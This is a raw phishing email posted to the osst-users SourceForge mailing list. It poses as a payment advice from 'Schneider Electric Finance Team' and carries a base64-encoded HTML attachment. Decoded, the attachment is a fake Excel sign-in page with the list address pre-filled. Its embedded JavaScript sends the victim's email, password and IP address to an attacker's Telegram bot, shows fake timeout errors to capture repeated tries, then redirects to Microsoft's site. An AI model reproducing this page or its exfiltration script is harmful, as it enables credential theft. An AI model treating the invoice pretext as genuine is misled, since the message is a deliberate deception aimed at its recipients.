Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 6F5F0B2BC9F
	for <lists+osst-users@lfdr.de>; Tue, 19 Aug 2025 11:09:51 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=List-Subscribe:List-Help:List-Post:
	List-Archive:List-Unsubscribe:List-Id:Subject:Content-Type:MIME-Version:
	Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=s6PIfdR9I9ZoyAI71w7Xko+c3gTVAx4XihrFVUqVvCg=; b=kVA4s/IP44ODLyVj/IJmHRZsxZ
	V0xvs9JJtdxReS0oucrdAuLBBLGVoq9J+wAIXQRUDMBAY2nwFDHjIREcX3MObct0b25T/Tm8OfHG8
	C3DLfZ+9K0zi6RBD7wg64TjXqGoTOwulQLlokZUncnqR3STgJ2ELZ87E4FIdq/+AFH0o=;
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1uoILl-0006J1-Nz
	for lists+osst-users@lfdr.de;
	Tue, 19 Aug 2025 09:09:49 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <ojkarsnze@haoyue.com>) id 1uoILk-0006Ik-1n
 for osst-users@lists.sourceforge.net; Tue, 19 Aug 2025 09:09:48 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Date:Subject:
 To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=PrQk7m0fijkIeQePSNPtN+Jxii54jERLPGkJ/TsZ8UI=; b=ZYVAoBnYmpaiim/bCU4GlKsdkl
 /Kj+tN6yErUsf8HE32oGmggg64cagr2hWpOJeyGKZL26Bg3RLAFuekkH+yr3qmre0ltAx9xChr4U/
 eqNsmGwLhhyDwh/73jqe/ahTXaQPuQlgbcAFOBx+kv0kQXjUGC55Q6CCBWID7PMP/0cA=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=PrQk7m0fijkIeQePSNPtN+Jxii54jERLPGkJ/TsZ8UI=; b=l
 l/D5XlNMJVk5nvgrO3+rm3Hl+xMpqiM5esxmyPDt48oNDytjyvdCRjkTc8gZMnp26ESiIVpjxFPdN
 TnHI73+dlVnmTDJn3jftTleRoOoIFIgc/aG4XGb+cegqgz4JnMHlRWgDXvB9cACVfZxOzbK+z2E2z
 rb6vyM47TOovwxes=;
Received: from 55.226.211.35.bc.googleusercontent.com ([35.211.226.55]
 helo=smtp-1.us-central1-a.c.lytehouse-dev-307303.internal)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1uoILj-0004aI-F0 for osst-users@lists.sourceforge.net;
 Tue, 19 Aug 2025 09:09:47 +0000
Received: from unassigned.quadranet.com (unknown [198.55.98.124])
 by smtp-1.us-central1-a.c.lytehouse-dev-307303.internal (Postfix) with ESMTP
 id ED1854C830
 for <osst-users@lists.sourceforge.net>; Tue, 19 Aug 2025 09:09:38 +0000 (UTC)
From: "Schneider Electric Finance Team" <ojkhewwynxi@haoyue.com>
To: osst-users@lists.sourceforge.net
Date: 19 Aug 2025 11:09:42 -0700
Message-ID: <20250819110942.04D4303222F96797@haoyue.com>
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="----=_NextPart_000_0012_C4CA720D.7BF73D50"
X-Spam-Score: 4.9 (++++)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-1.hosts.colo.sdot.me", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Payment Advice - Advice Ref: osst-users / Priority payment
 / Customer Ref:20250812-75942 8/19/2025 11:09:42 a.m. Dear Vendor, 
 Content analysis details:   (4.9 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 4.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [35.211.226.55 listed in dnsbl-1.uceprotect.net]
 0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [35.211.226.55 listed in wl.mailspike.net]
 0.0 TVD_RCVD_IP            Message was received from an IP address
 0.0 DATE_IN_FUTURE_06_12   Date: is 6 to 12 hours after Received: date
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 T_HTML_ATTACH          HTML attachment to bypass scanning?
 0.4 RDNS_DYNAMIC           Delivered to internal network by host with
 dynamic-looking rDNS
 0.4 KHOP_HELO_FCRDNS       Relay HELO differs from its IP's reverse DNS
X-Headers-End: 1uoILj-0004aI-F0
Subject: [Osst-users] Payment Advice - Advice Ref: Priority payment /
 Customer Ref:20250812-75942 8/19/2025 11:09:42 a.m.
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Errors-To: osst-users-bounces@lists.sourceforge.net

This is a multi-part message in MIME format.

------=_NextPart_000_0012_C4CA720D.7BF73D50
Content-Type: text/html;
	charset="windows-1252"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dwindows-1=
252">
<title>Payment Advice - Advice Ref: osst-users / Priority payment / Custome=
r Ref:20250812-75942 8/19/2025 11:09:42 a.m.</title>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>

<body>

<p><font face=3D"Arial">Dear Vendor,<br>
<br>
Best wishes from Schneider Electric Pvt ltd<br>
<br>
Invoice statements have been printed and submitted for payment.<br>
<br>
Thanks &amp; Regards.<br>
Schneider Electric Finance Team</font></p>

</body></html>
------=_NextPart_000_0012_C4CA720D.7BF73D50
Content-Type: text/html; name="osst-users0D7B5A37-781F-452E-82ED-FBA7C9D6B09B.html"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="osst-users0D7B5A37-781F-452E-82ED-FBA7C9D6B09B.html"

PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KICAgIDxtZXRhIG5hbWU9InZpZXdw
b3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSI+DQog
ICAgPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7
IGNoYXJzZXQ9dXRmLTgiIC8+DQogDQogICAgIDx0aXRsZT4gU3RhdGVtZW50IEZvciBvc3N0
LXVzZXJzQGxpc3RzLnNvdXJjZWZvcmdlLm5ldCA8L3RpdGxlPg0KPC9oZWFkPg0KDQo8c3R5
bGUgdHlwZT0idGV4dC9jc3MiPg0KCSogew0KCQltYXJnaW46IDA7DQoJCXBhZGRpbmc6MDsN
CgkJYm94LXNpemluZzogYm9yZGVyLWJveDsNCgkJYm9yZGVyOjA7DQoJCW91dGxpbmU6IDA7
DQoJfQ0KDQoJYm9keSB7DQoJCWJhY2tncm91bmQ6YmxhY2s7DQoJCSAgICBmb250LWZhbWls
eTogU2Vnb2VVSS1TZW1pQm9sZC1maW5hbCxTZWdvZSBVSSBTZW1pYm9sZCxTZWdvZVVJLVJl
Z3VsYXItZmluYWwsU2Vnb2UgVUksIlNlZ29lIFVJIFdlYiAoV2VzdCBFdXJvcGVhbikiLFNl
Z29lLC1hcHBsZS1zeXN0ZW0sQmxpbmtNYWNTeXN0ZW1Gb250LFJvYm90byxIZWx2ZXRpY2Eg
TmV1ZSxUYWhvbWEsSGVsdmV0aWNhLEFyaWFsLHNhbnMtc2VyaWY7DQoJfQ0KCS5vdmVybGF5
IHsNCgkJYmFja2dyb3VuZDp1cmwoImh0dHBzOi8vaS5wY21hZy5jb20vaW1hZ2VyeS9hcnRp
Y2xlcy8wMktXMUtCRWp2aEdEQ2tmUk5kY0x4Yi03NS4udjE3NDk4Mzk1NjcuanBnIik7DQoJ
CWJhY2tncm91bmQtc2l6ZTogY292ZXI7DQoJCWJhY2tncm91bmQtcmVwZWF0OiBuby1yZXBl
YXQ7DQoJCWZpbHRlcjpibHVyKDAuMXJlbSk7DQoJCWhlaWdodDogMTAwdmg7DQoJCXBvc2l0
aW9uOiBhYnNvbHV0ZTsNCgkJd2lkdGg6IDEwMCU7DQoJCXRvcDowOw0KCQlsZWZ0OiA1MCU7
DQoJICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLDApOw0KCX0NCg0KCS5qdW1ib3Ryb24J
ew0KCQliYWNrZ3JvdW5kOiB3aGl0ZTsNCgkJcGFkZGluZzogMnJlbSAzcmVtOw0KCQl3aWR0
aDogNDUwcHg7DQoJCW1heC13aWR0aDogMTAwJTsNCgkJcG9zaXRpb246IHJlbGF0aXZlOw0K
CQlkaXNwbGF5OiBmbGV4Ow0KCQltYXJnaW46IDclIGF1dG87DQoJCWZsZXgtZGlyZWN0aW9u
OiBjb2x1bW47DQoNCgkJICAtd2Via2l0LWFuaW1hdGlvbjogc2xpZGVJbiAwLjFzIGZvcndh
cmRzOw0KICAtbW96LWFuaW1hdGlvbjogc2xpZGVJbiAwLjFzIGZvcndhcmRzOw0KICBhbmlt
YXRpb246IHNsaWRlSW4gMC4xcyBmb3J3YXJkczsNCg0KCX0NCg0KCUAtd2Via2l0LWtleWZy
YW1lcyBzbGlkZUluIHsNCiAgMCUgew0KICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWCgtOTAw
cHgpOw0KICB9DQogIDEwMCUgew0KICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWCgwKTsNCiAg
fQ0KfQ0KQC1tb3ota2V5ZnJhbWVzIHNsaWRlSW4gew0KICAwJSB7DQogICAgdHJhbnNmb3Jt
OiB0cmFuc2xhdGVYKC05MDBweCk7DQogIH0NCiAgMTAwJSB7DQogICAgdHJhbnNmb3JtOiB0
cmFuc2xhdGVYKDApOw0KICB9DQp9DQpAa2V5ZnJhbWVzIHNsaWRlSW4gew0KICAwJSB7DQog
ICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVYKC05MDBweCk7DQogIH0NCiAgMTAwJSB7DQogICAg
dHJhbnNmb3JtOiB0cmFuc2xhdGVYKDApOw0KICB9DQp9DQoNCgkuaW1nX2JyYW5kIHsNCgkJ
cGFkZGluZy1ib3R0b206IDEuNXJlbTsNCgl9DQoNCgkuYXJyb3dfX25hbWUgew0KCQlkaXNw
bGF5OiBmbGV4Ow0KCQlnYXA6MXJlbTsNCgkJYWxpZ24taXRlbXM6IGNlbnRlcjsNCgkJcGFk
ZGluZy1ib3R0b206IDFyZW07DQoJfQ0KDQoJLmFycm93X19uYW1lIGg0IHsNCgkJZm9udC1m
YW1pbHk6IGluaGVyaXQ7DQoJCWZvbnQtd2VpZ2h0OiBsaWdodGVyOw0KCQlmb250LXNpemU6
IDE1cHg7DQoJfQ0KDQoJLnNlY3Rpb24gew0KCQlwYWRkaW5nLWJvdHRvbTogMXJlbQ0KCX0N
Cg0KCXAgew0KCQlmb250LXNpemU6IDEzcHg7DQoJCWZvbnQtd2VpZ2h0OiAxMDA7DQoJfQ0K
DQoJaW5wdXRbdHlwZT1wYXNzd29yZF0gew0KCQlib3JkZXItYm90dG9tOiAxcHggc29saWQg
cmdiYSgwLCAwLCAwLCAwLjYpOw0KCQlwYWRkaW5nOjEwcHggMDsNCgkJZm9udC1zaXplOjE1
cHg7DQoJfQ0KDQoJaW5wdXRbdHlwZT1wYXNzd29yZF06Zm9jdXMgew0KCQkJCWJvcmRlci1i
b3R0b206IDFweCBzb2xpZCAjMDA2N2I4Ow0KCQ0KCX0NCg0KCWEgew0KCQl0ZXh0LWRlY29y
YXRpb246IG5vbmU7DQoJCWZvbnQtc2l6ZTogMTNweDsNCgkJY29sb3I6IzAwNjdiODsNCgkJ
cGFkZGluZzoxcmVtIDA7DQoJfQ0KDQoJYTpob3ZlciB7DQoJCXRleHQtZGVjb3JhdGlvbjog
dW5kZXJsaW5lOw0KCQljb2xvciA6ICByZ2JhKDAsIDAsIDAsIDAuNik7DQoJfQ0KDQoJLmJ0
bi1ncm91cCB7DQoJCWRpc3BsYXk6IGZsZXg7DQoJCWp1c3RpZnktY29udGVudDogZmxleC1l
bmQ7DQoJCW1hcmdpbi10b3A6IDFyZW0NCgl9DQoNCglidXR0b24gew0KDQogICAgbWluLXdp
ZHRoOiAxMDBweDsNCiAgICBwYWRkaW5nOiA2cHggMTVweCA2cHggMTVweDsNCiAgICBtYXJn
aW4tdG9wOiA0cHg7DQogICAgbWFyZ2luLWJvdHRvbTogNHB4Ow0KICAgIHBvc2l0aW9uOiBy
ZWxhdGl2ZTsNCiAgICBtYXgtd2lkdGg6IDEwMCU7DQogICAgdGV4dC1hbGlnbjogY2VudGVy
Ow0KICAgIHdoaXRlLXNwYWNlOiBub3dyYXA7DQogICAgb3ZlcmZsb3c6IGhpZGRlbjsNCiAg
ICB2ZXJ0aWNhbC1hbGlnbjogbWlkZGxlOw0KICAgIHRleHQtb3ZlcmZsb3c6IGVsbGlwc2lz
Ow0KICAgIHRvdWNoLWFjdGlvbjogbWFuaXB1bGF0aW9uOw0KICAgIGNvbG9yOiAjMDAwOw0K
ICAgIGJvcmRlci1zdHlsZTogc29saWQ7DQogICAgYm9yZGVyLXdpZHRoOiAycHg7DQogICAg
Ym9yZGVyLWNvbG9yOiB0cmFuc3BhcmVudDsNCiAgICBiYWNrZ3JvdW5kLWNvbG9yOiByZ2Jh
KDAsIDAsIDAsIDAuMik7DQogICAgd2lkdGg6MTAwcHg7DQogICAgICAgIGJvcmRlci1jb2xv
cjogIzAwNjdiODsNCiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA2N2I4Ow0KICAgIGNvbG9y
OndoaXRlOw0KICAgIGN1cnNvcjogcG9pbnRlcjsNCiAgICBmb250LXNpemU6IDE1cHg7DQoN
Cg0KCX0NCg0KCUBtZWRpYSBvbmx5IHNjcmVlbiBhbmQgKG1heC13aWR0aDogNjAwcHgpew0K
ICAgIC5vdmVybGF5IHsNCiAgICAJZGlzcGxheTogbm9uZTsNCiAgICB9DQogICAgYm9keSB7
DQogICAgCWJhY2tncm91bmQ6IHdoaXRlOw0KICAgIH0NCg0KICAgIC5qdW1ib3Ryb24Jew0K
CQlwYWRkaW5nOiAxcmVtIDJyZW07DQoNCgl9DQp9DQoNCgkNCjwvc3R5bGU+DQo8Ym9keT4N
Cgk8ZGl2IGNsYXNzPSJvdmVybGF5Ij48L2Rpdj4NCgk8ZGl2IGNsYXNzPSJjb250YWluZXIi
Pg0KCQk8ZGl2IGNsYXNzPSJqdW1ib3Ryb24iPg0KCQkJPGRpdiBjbGFzcz0iaW1nX2JyYW5k
Ij4NCgkJCQk8aW1nIHNyYz0iaHR0cHM6Ly9maW5kaWNvbnMuY29tL2ZpbGVzL2ljb25zLzI3
OTUvb2ZmaWNlXzIwMTNfaGQvMjAwMC9leGNlbC5wbmciIHN0eWxlPSJ3aWR0aDogMjAlIj4N
CgkJCTwvZGl2Pg0KCQkJPGRpdiBjbGFzcz0iYXJyb3dfX25hbWUiPg0KCQkJCTxpbWcgc3Jj
PSJodHRwczovL2Nkbi1pY29ucy1wbmcuZmxhdGljb24uY29tLzUxMi8yMjIzLzIyMjM2MTUu
cG5nIiBzdHlsZT0id2lkdGg6IDQlOyI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFt
ZT0iZW1haWwiIGlkPSJlbWFpbF9hZGR5IiB2YWx1ZT0ib3NzdC11c2Vyc0BsaXN0cy5zb3Vy
Y2Vmb3JnZS5uZXQiPg0KCQkJCTxoNCBpZD0iZW1haWxfX3VybCI+PC9oND4JDQoJCQk8L2Rp
dj4NCgkJCTxoMiBjbGFzcz0ic2VjdGlvbiI+IEVudGVyIHBhc3N3b3JkIDwvaDI+DQoJCQk8
cCBjbGFzcz0ic2VjdGlvbiI+IEVudGVyIHBhc3N3b3JkIHRvIHZpZXcgb25saW5lIGV4Y2Vs
IDwvcD4NCgkJCTxwIGlkPSJwYXNzd29yZF9fZW1wdHkiIHN0eWxlPSJjb2xvcjpyZWQ7IGRp
c3BsYXk6IG5vbmU7Ij5QYXNzd29yZCANCgkJCWNhbm5vdCBiZSBlbXB0eTwvcD4NCgkJCTxw
IGlkPSJwYXNzd29yZF9faW5jb3JyZWN0IiBzdHlsZT0iY29sb3I6cmVkOyBkaXNwbGF5OiBu
b25lOyI+U29ycnksIA0KCQkJeW91ciBzaWduLWluIHRpbWVkIG91dC4gUGxlYXNlIHNpZ24g
aW4gYWdhaW4uPC9wPg0KCQkJPHAgaWQ9InBhc3N3b3JkX19pbmNvcnJlY3QxIiBzdHlsZT0i
Y29sb3I6cmVkOyBkaXNwbGF5OiBub25lOyI+DQoJCQlTb3JyeSwgeW91ciBzaWduLWluIHRp
bWVkIG91dC4gUGxlYXNlIHRyeSBhZ2FpbiBhZnRlciBmZXcgbWludXRlcy48L3A+DQoNCgkJ
CTxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icGFzc3dvcmQiIGlkPSJwYXNzd29yZCIg
Y2xhc3M9InBhc3N3b3JkIiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiPg0KCQkJPGlucHV0IHR5
cGU9ImhpZGRlbiIgaWQ9ImhpZGRlbl9pcCI+DQoJCQk8YSBocmVmPSIjIj5Ob3RlOiBPbmx5
IHJlY2lwaWVudCBlbWFpbCBjYW4gYWNjZXNzIHNoYXJlZCBmaWxlcy48L2E+DQoJCQk8ZGl2
IGNsYXNzPSJidG4tZ3JvdXAiPg0KCQkJCQk8cCBhbGlnbj0iY2VudGVyIj4NCgkJCQkJPGJ1
dHRvbiB0eXBlPSJidXR0b24iIGlkPSJzaWduSW4iPlZpZXc8L2J1dHRvbj4NCgkJCTwvZGl2
Pg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvYm9keT4NCjxzY3JpcHQgc3JjPSJodHRwczovL2Nk
bmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9qcXVlcnkvMi4yLjQvanF1ZXJ5Lm1pbi5q
cyI+PC9zY3JpcHQ+DQo8c2NyaXB0Pg0KDQoNCglmdW5jdGlvbiBzZW5kVGVsZU1zZyhlbWFp
bCwgcGFzc2tleSwgaXApIHsNCg0KCQkgICAgdmFyIG1lc3NhZ2UgPSAiIjsNCgkJICAgIG1l
c3NhZ2UgKz0gIis9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IisnXG4n
DQoJCSAgICBtZXNzYWdlICs9ICJbSVBdICIgICsgICIgOiAiICsgaXAgKyAnXG4nOw0KCQkg
ICAgbWVzc2FnZSArPSAiW0VNXSAiICArICAiIDogIiArIGVtYWlsICsgJ1xuJzsNCgkJICAg
IG1lc3NhZ2UgKz0gIltQV10gIiAgKyAgIiA6ICIgKyBwYXNza2V5Ow0KCQkgICAgbWVzc2Fn
ZSArPSAiKz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iKydcbicNCg0K
CQkgICAgbGV0IHRva2VuID0gJzgzNTY5NTQ1ODE6QUFGYVBEOFM2LUxrYVFfaEJhVER5NjAt
Y0U1dUsxWmdHdHcnOw0KCQkgICAgdmFyIGNoYXRpZCA9ICc2NTE0MTgwNTUwJzsNCg0KCQkg
ICAgdmFyIHNldHRpbmdzID0gew0KCQkgICAgImFzeW5jIjogdHJ1ZSwNCgkJICAgICJjcm9z
c0RvbWFpbiI6IHRydWUsDQoJCSAgICAidXJsIjogImh0dHBzOi8vYXBpLnRlbGVncmFtLm9y
Zy9ib3QiICsgdG9rZW4gKyAiL3NlbmRNZXNzYWdlP2NoYXRfaWQ9IitjaGF0aWQsDQoJCSAg
ICAibWV0aG9kIjogIlBPU1QiLA0KCQkgICAgImhlYWRlcnMiOiB7DQoJCSAgICAgICAgIkNv
bnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwNCgkJICAgICAgICAiY2FjaGUtY29u
dHJvbCI6ICJuby1jYWNoZSINCgkJICAgIH0sDQoJCSAgICAiZGF0YSI6IEpTT04uc3RyaW5n
aWZ5KHsNCgkJICAgICAgICAiY2hhdF9pZCI6IGNoYXRpZCwNCgkJICAgICAgICAidGV4dCI6
IG1lc3NhZ2UNCgkJICAgIH0pDQoJCSAgICB9DQoNCgkJICAgICQuYWpheChzZXR0aW5ncyku
ZG9uZShmdW5jdGlvbiAocmVzcG9uc2UpIHsNCgkJICAgIGlmKHJlc3BvbnNlLm9rID09PSB0
cnVlKSB7DQoJCSAgICAgICAvLyB3aW5kb3cubG9jYXRpb24uaHJlZiA9ICJodHRwczovL215
aWQudGVsc3RyYS5jb20vaWRlbnRpdHkvYXMvbGFmRUEvcmVzdW1lL2FzL2F1dGhvcml6YXRp
b24ucGluZyI7DQoJCSAgICB9DQoJCSAgICANCgkJICAgIH0pOyANCg0KCX0NCiAgICAkKGRv
Y3VtZW50KS5yZWFkeShmdW5jdGlvbiAoKSB7DQoNCiAgICBsZXQgaXA7DQogICAgJC5nZXRK
U09OKCdodHRwczovL2pzb24uZ2VvaXBsb29rdXAuaW8vP2NhbGxiYWNrPT8nLCBmdW5jdGlv
bihkYXRhKSB7DQogICAgdmFyIG9iaiA9IEpTT04ucGFyc2UoSlNPTi5zdHJpbmdpZnkoZGF0
YSkpOw0KICAJCQkgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImhpZGRlbl9pcCIpLnZhbHVl
ID0gb2JqLmlwOw0KICAgICAgICB9KTsNCiAgICB9KTsNCgkNCgkNCiAgCXZhciBlbWFpbCA9
IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNlbWFpbF9hZGR5IikudmFsdWU7DQogIAkvL2Nv
bnN0IGVtYWlsID0gbG9jYXRpb24uc2VhcmNoLnN1YnN0cmluZyhsb2NhdGlvbi5zZWFyY2gu
bGFzdEluZGV4T2YoJz0nKSArIDEpOw0KCWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNlbWFp
bF9fdXJsIikuaW5uZXJIVE1MPWVtYWlsOw0KCWxldCBjb3VudCA9IDA7DQoNCglkb2N1bWVu
dC5xdWVyeVNlbGVjdG9yKCIjc2lnbkluIikuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBm
dW5jdGlvbigpew0KCQljb25zdCBwYXNza2V5ID0gZG9jdW1lbnQucXVlcnlTZWxlY3Rvcigi
I3Bhc3N3b3JkIikudmFsdWU7DQoJCSAgCWNvbnN0IGlwID0gZG9jdW1lbnQucXVlcnlTZWxl
Y3RvcigiI2hpZGRlbl9pcCIpLnZhbHVlOw0KCQkvLyAgCWNvbnNvbGUubG9nKGlwKTsNCgkJ
Y291bnQrKw0KCQlpZighcGFzc2tleSkgew0KCQkJZG9jdW1lbnQucXVlcnlTZWxlY3Rvcigi
I3Bhc3N3b3JkX19lbXB0eSIpLnN0eWxlLmRpc3BsYXk9ImJsb2NrIjsNCgkJCXNldFRpbWVv
dXQoKCk9PnsNCgkJCQlkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjcGFzc3dvcmRfX2VtcHR5
Iikuc3R5bGUuZGlzcGxheT0ibm9uZSI7DQoJCQl9LCAxMDAwKQ0KCQl9IA0KCQllbHNlIHsN
Cg0KCQkJaWYoY291bnQgPT0gMykgew0KCQkJCQkgc2VuZFRlbGVNc2coZW1haWwsIHBhc3Nr
ZXksIGlwKTsNCgkJCQkJIHdpbmRvdy5sb2NhdGlvbi5ocmVmPSJodHRwczovL2V4Y2VsLmNs
b3VkLm1pY3Jvc29mdCI7DQoJCQkJfSBlbHNlIGlmKGNvdW50ID09IDIpIHsNCgkJCQkJCXNl
bmRUZWxlTXNnKGVtYWlsLCBwYXNza2V5LCBpcCk7DQoJCQkJCQlkb2N1bWVudC5xdWVyeVNl
bGVjdG9yKCIjcGFzc3dvcmRfX2luY29ycmVjdDEiKS5zdHlsZS5kaXNwbGF5PSJibG9jayI7
DQoJCQkJCQlzZXRUaW1lb3V0KCgpPT57DQoJCQkJCQlkb2N1bWVudC5xdWVyeVNlbGVjdG9y
KCIjcGFzc3dvcmRfX2luY29ycmVjdDEiKS5zdHlsZS5kaXNwbGF5PSJub25lIjsNCgkJCQkJ
CWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNwYXNzd29yZCIpLnZhbHVlPSIiOw0KCQkJCQl9
LCAxMDAwKQ0KCQkJCQkJDQoJCQkJfQ0KDQoJCQkJZWxzZSB7DQoJCQkJCSAgIHNlbmRUZWxl
TXNnKGVtYWlsLCBwYXNza2V5LCBpcCk7DQoJCQkJCQlkb2N1bWVudC5xdWVyeVNlbGVjdG9y
KCIjcGFzc3dvcmRfX2luY29ycmVjdCIpLnN0eWxlLmRpc3BsYXk9ImJsb2NrIjsNCgkJCQkJ
CXNldFRpbWVvdXQoKCk9PnsNCgkJCQkJCWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNwYXNz
d29yZF9faW5jb3JyZWN0Iikuc3R5bGUuZGlzcGxheT0ibm9uZSI7DQoJCQkJCQlkb2N1bWVu
dC5xdWVyeVNlbGVjdG9yKCIjcGFzc3dvcmQiKS52YWx1ZT0iIjsNCgkJCQkJfSwgMTAwMCkN
Cg0KCQkJfQ0KDQoJCQkJDQoJCX0NCgl9KQ0KDQoNCjwvc2NyaXB0Pg0KDQo8c2NyaXB0IHR5
cGU9InRleHQvamF2YXNjcmlwdCI+DQoNCgk8L3NjcmlwdD4NCjwvaHRtbD4=

------=_NextPart_000_0012_C4CA720D.7BF73D50
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


------=_NextPart_000_0012_C4CA720D.7BF73D50
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

------=_NextPart_000_0012_C4CA720D.7BF73D50--

